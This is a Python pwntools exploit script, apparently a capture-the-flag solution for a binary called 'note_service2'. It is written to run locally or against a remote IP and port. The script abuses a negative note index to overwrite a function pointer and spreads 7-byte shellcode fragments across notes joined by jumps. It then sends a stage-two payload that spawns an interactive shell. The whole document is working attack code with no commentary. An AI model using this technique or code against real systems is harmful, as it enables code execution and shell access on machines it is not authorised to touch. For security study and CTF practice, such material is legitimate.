from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./note_service2")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./note_service2")
else:
	p = remote("111.198.29.45","40181")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./note_service2")

def menu(choice):
	p.sendlineafter("your choice>> ",str(choice))

def add(index,size,content):
	menu(1)
	p.sendlineafter("index:",str(index))
	p.sendlineafter("size:",str(size))
	p.sendafter("content:",content)

def free(index):
	menu(4)
	p.sendlineafter("index:",str(index))

code_base = 0x555555554000
def debugf():
	if debug:
		#gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0xE53),b2 = hex(code_base + 0xEBF)))
		gdb.attach(p,"b *{b2}".format(b2 = hex(code_base + 0xEBF)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
context.bits = 64
sc = ""
debugf()
sc = '''
xor rax,rax
xor edi,edi
jmp $+27
mov rsi,rsp
nop
nop
jmp $+27
mov edx,0x200
jmp $+27
syscall
jmp rsp
'''
sc = asm(sc)
init = sc[:7]
others = sc[7:]
index = -(0x2020A0 - 0x202068) / 8
add(index,8,init + "\n")
i = 0
while sc:
	add(i,8,sc[:7] + "\n")
	sc = sc[7:]
menu("5")
sc2 = asm(shellcraft.sh())
p.send(sc2)

p.interactive()
